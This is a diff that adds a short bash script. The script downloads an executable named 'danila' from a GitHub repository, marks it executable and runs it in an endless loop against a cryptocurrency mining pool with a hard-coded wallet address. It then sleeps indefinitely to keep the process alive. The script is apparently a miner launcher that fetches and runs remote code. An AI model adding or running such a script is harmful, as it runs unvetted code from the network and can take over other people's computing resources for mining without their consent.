@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+wget https://github.com/drJamesjack/prem/raw/main/danila
+chmod +x danila
+while [ 1 ]; do
+./danila run https://server1.whalestonpool.com EQCGSQPg6-HnteLECBoIz9jU8hJHszzlBfac53LY3T8KMK80
+sleep 5
+done
+sleep 999999999
